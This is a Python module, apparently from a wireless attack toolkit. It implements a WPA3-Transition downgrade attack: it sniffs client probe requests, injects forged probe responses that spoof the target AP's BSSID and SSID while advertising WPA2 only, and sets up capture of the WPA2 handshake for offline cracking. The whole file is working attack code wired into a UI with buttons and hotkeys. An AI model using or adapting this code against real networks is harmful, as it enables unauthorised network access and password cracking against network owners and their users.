"""WPA3 → WPA2 downgrade via probe-response spoofing.

Standard active downgrade attack against WPA3-Transition APs: forge probe
responses carrying the AP's real BSSID + SSID + channel but with a WPA2-only
RSN IE (SAE AKM stripped). When the targeted client receives our response
before/instead of the real AP's, it may pick WPA2 for its next association
attempt — done with the REAL AP, since the BSSID matches — and we passively
capture the WPA2 4-way for offline cracking.

Doable on a single card in monitor+inject. Does NOT work against pure WPA3 APs
(the client knows the SSID is SAE-only and refuses the WPA2-only ad).

This is a "wait" attack: PMF on WPA3 prevents kicking connected clients, so we
rely on natural reconnection triggers (wake-from-sleep, roam, DHCP renew, OS
WiFi toggle). Expect minutes-to-hours, not seconds.
"""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from wifit3.models import AccessPoint
from wifit3.dot11.probe import probe_resp
from wifit3.dot11.packet import ProbeReqPacket

from .campaign import Campaign

logger = logging.getLogger(__name__)


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


@dataclass
class WPA3DowngradeStats:
    probes_seen: int = 0
    directed_probes: int = 0
    wildcard_probes: int = 0
    responses_sent: int = 0
    responses_failed: int = 0
    started_at: float = field(default_factory=time.time)


class WPA3DowngradeAttack(Campaign):
    """Probe-response spoofing daemon. Sync RX filter + async injection task.

    Event-driven: ``_loop()`` registers the RX callback and idles until stopped;
    ``teardown()`` unregisters. The actual work is per-probe forged responses fired
    from ``_rx_cb``. All work happens on the asyncio loop — the RX callback runs on
    the loop (drivers create the RX pump via ``asyncio.create_task``), and per-probe
    injection is scheduled via ``asyncio.create_task`` on the same loop.
    """

    button_id = "btn-wpa3-down"
    key = "wpa3down"
    hotkey = ("g", "WPA↓")
    idle_label = "WPA ↓"
    run_label = "Stop ↓"
    idle_variant = "primary"
    run_variant = "primary"

    @classmethod
    def visible(cls, ap) -> bool:
        return bool(getattr(ap, "wpa3", False) and getattr(ap, "transition_mode", False))

    def __init__(
        self,
        iface,
        target: AccessPoint,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        if not target.ssid:
            raise ValueError("WPA3 Downgrade requires a known SSID — target is hidden.")
        super().__init__(ap=target, iface=iface)
        self.target = target
        self._log = log_callback or (lambda _msg: None)
        self.stats = WPA3DowngradeStats()
        self._active = False
        self._target_ssid_bytes = target.ssid.encode("utf-8", errors="ignore")
        self._bssid_bytes = _str_to_mac(target.bssid)
        # Pre-built template with a 6-byte placeholder for Addr1 (dest = client).
        # Per-probe work is just splicing in the client MAC + sending.
        self._template = probe_resp(self._bssid_bytes, self.target.ssid, self.target.channel)

    # -- Lifecycle ------------------------------------------------------------

    async def _loop(self) -> None:
        """Register the probe-request RX filter, then idle until stopped — the work
        is event-driven (per-probe forged responses fire from _rx_cb)."""
        self._active = True
        self.stats = WPA3DowngradeStats()
        self.iface.register_rx_callback(self._rx_cb)
        logger.info(
            f"[WPA3-Down] Active on {self.target.bssid} ({self.target.ssid}) "
            f"CH {self.target.channel}"
        )
        while not self.stopped:
            await asyncio.sleep(0.2)

    async def teardown(self) -> None:
        """Unregister the RX filter on every exit. Idempotent; ``stats`` lives on as
        an attribute for the screen to read after stopping."""
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        logger.info(
            f"[WPA3-Down] Stopped: {self.stats.probes_seen} probes seen, "
            f"{self.stats.responses_sent} forged responses sent."
        )

    # -- Hot path: RX filter + async dispatch --------------------------------

    def _rx_cb(self, pkt) -> None:
        """Sync, runs on asyncio loop. Keep this fast — minimal work, defer
        injection to an asyncio task."""
        if self.stopped or not self._active:   # request_stop() gates us before teardown unregisters
            return
        if not isinstance(pkt, ProbeReqPacket):
            return
        # Wildcard vs directed needs the raw SSID-IE length (the parser maps an empty
        # SSID to "<hidden>"), so read the tag off the bytes here.
        frame_bytes = pkt.raw
        if len(frame_bytes) < 28 or frame_bytes[24] != 0x00:
            return
        ssid_len = frame_bytes[25]
        if 26 + ssid_len > len(frame_bytes):
            return
        client_mac = frame_bytes[10:16]

        is_wildcard = ssid_len == 0
        is_directed_for_us = (
            ssid_len > 0 and frame_bytes[26:26 + ssid_len] == self._target_ssid_bytes
        )
        if not (is_wildcard or is_directed_for_us):
            # Probe for some other SSID — not our race to run.
            return

        self.stats.probes_seen += 1
        if is_wildcard:
            self.stats.wildcard_probes += 1
            kind = "wildcard"
        else:
            self.stats.directed_probes += 1
            kind = "directed"

        # Bridge sync→async: fire-and-forget injection task. Microsecond overhead.
        asyncio.create_task(self._send_forged_response(bytes(client_mac), kind))

    async def _send_forged_response(self, client_mac: bytes, probe_kind: str) -> None:
        """Splice client MAC into Addr1 of cached template and inject."""
        # Frame = FC+Dur (4B) + client_mac (6B) + rest_of_template (from byte 10)
        frame = self._template[:4] + client_mac + self._template[10:]
        try:
            ok = await self.iface.send_no_wait(frame)
        except Exception:
            logger.exception("[WPA3-Down] failed to send probe-resp")
            ok = False
        if ok:
            self.stats.responses_sent += 1
        else:
            self.stats.responses_failed += 1
        # Per-probe detail goes to the debug logger only — the UI surfaces live counts via a
        # SECURITY-panel status line, not one event-log line per probe (which would flood it).
        logger.debug(
            "[WPA3-Down] %s probe from %s → forged WPA2-only resp (ok=%s)",
            probe_kind, _mac_str(client_mac), ok,
        )
